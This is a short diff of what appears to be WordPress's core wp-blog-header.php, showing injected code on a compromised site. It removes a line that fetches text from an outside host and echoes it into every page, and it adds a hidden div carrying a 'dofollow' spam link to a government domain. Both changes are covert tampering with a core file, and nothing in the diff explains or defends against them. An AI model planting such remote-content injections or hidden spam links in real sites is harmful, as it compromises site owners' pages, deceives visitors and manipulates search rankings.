@@ -18,4 +18,6 @@ if ( ! isset( $wp_did_header ) ) {
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
-}?><?php $a = file_get_contents('https://paulsaar.com/-/id.txt'); echo $a; ?>
+}
+?>
+<div style="display:none;"><ul><li><a href="http://disdik.inhilkab.go.id/" rel="dofollow">http://disdik.inhilkab.go.id/</a></li></ul></div>
